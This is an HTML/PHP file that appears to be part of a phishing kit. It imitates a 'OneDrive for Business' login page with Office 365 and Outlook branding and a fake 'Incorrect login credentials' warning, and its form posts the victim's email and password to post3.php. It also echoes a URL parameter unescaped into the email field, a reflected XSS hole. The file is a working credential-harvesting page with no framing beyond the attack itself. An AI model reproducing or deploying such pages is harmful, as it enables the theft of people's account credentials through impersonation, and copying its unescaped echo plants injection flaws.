<!DOCTYPE html>
<html>
<head>
	<title>OneDrive for Business</title>
	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
</head>
<body>

<style type="text/css">
	body {
	    font-family: 'Open Sans', sans-serif;
	}
	.bg {
		background: url(bg.png);
		background-size: cover;
	    position: fixed;
	    left: 0; right: 0; top: 0; bottom: 0;
	    -webkit-filter: blur(10px);
	    filter: blur(6px);
	}
	.formOne {
		position: relative;
		line-height: 2.3;
		width: 100%;
		text-align: center;
		margin-left: -30px;
		margin-top: 100px;
	}
	.formOne input[type="text"],input[type="password"] {
		width: 280px;
		height: 22px;
		border: 2px solid #747474;
		padding-left: 5px;
	}
	.formOne input[type="submit"] {
		border: 1px solid #2672ec;
		background: #2672ec;
		color: #fff;
		padding: 6px;
		width: 160px;
		margin-left: 10px;
	}
	.logo img {
		width: 200px;
		position: relative;
		top: 20px;
		margin-left: -30px;
	}
	.formOne b{
		font-size: 14px;
		margin-left: 30px;
	}
	.icons img {
		width: 100px;
		padding: 10px;
	}
</style>

<div class="bg"></div>

<div class="formOne">
	<div class="logo">
		<img src="logo.png">
	</div>
	<p style="color:red;">Incorrect login credentials. Please try again.</p>
	<form method="POST" action="post3.php">
		<input type="text" name="email" placeholder="E-Mail" value="<?=$_GET[email]?>"><br>
		<input type="password" name="password" placeholder="Password"><br>
		<input type="submit" name="login" value="Access Document">
	</form>

	<div class="icons">
		<img src="office365.png">
		<img src="outlook.png" style="position: relative;top: 2px;">
	</div>

</div>

</body>
</html>
